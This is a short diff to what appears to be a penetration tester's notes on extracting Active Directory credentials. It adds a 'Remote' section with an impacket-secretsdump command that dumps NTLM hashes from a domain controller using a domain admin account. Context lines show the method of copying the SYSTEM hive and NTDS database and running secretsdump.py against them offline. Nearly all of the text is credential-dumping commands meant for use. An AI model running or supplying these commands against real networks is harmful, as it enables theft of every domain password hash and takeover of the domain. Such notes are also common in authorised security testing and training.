@@ -1,5 +1,6 @@
-C:\Windows\system32>C:
+### Local DC
 
+C:\Windows\system32>C:
 
 C:\Windows\system32>cd ..
 C:\Windows>cd ..
@@ -43,6 +44,9 @@ GET THE SYSTEM FILE ASWELL (WINDOWS SYSTEM32 CONFIG)
 C:\Windows\System32\Config
 SYSTEM
 NTDS - in the windows folder
+
+### Remote
+impacket-secretsdump -just-dc-ntlm FQDN/DA-account@DC-IP
 
 ***New commands*** (python3.9)
 /usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash -user-status -outputfile <filename> local
